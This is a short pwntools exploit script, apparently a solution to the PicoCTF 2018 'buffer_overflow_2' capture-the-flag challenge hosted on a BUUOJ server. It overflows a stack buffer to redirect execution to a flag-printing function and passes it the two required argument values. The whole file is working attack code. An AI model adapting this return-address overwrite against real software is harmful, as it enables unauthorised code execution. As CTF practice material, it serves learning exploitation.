from pwn import *


r = remote('node5.buuoj.cn', 25445)
# r = process(r'./PicoCTF_2018_buffer_overflow_2')
context.log_level = 'debug'

flag_addr = 0x80485CB
vuln_addr = 0x8048646
a1_addr = 0xdeadbeef  # print(hex((-559038737) & 0xFFFFFFFF))
a2_addr = 0xdeadc0de  # print(hex((-559038242) & 0xFFFFFFFF))
# gdb.attach(r)
# if ( a1 == -559038737 && a2 == -559038242 ) {...}
payload = b'A' * (0x6C + 4) + p32(flag_addr) + p32(vuln_addr) + p32(a1_addr) + p32(a2_addr)
r.sendlineafter(b'string: ', payload)
r.interactive()
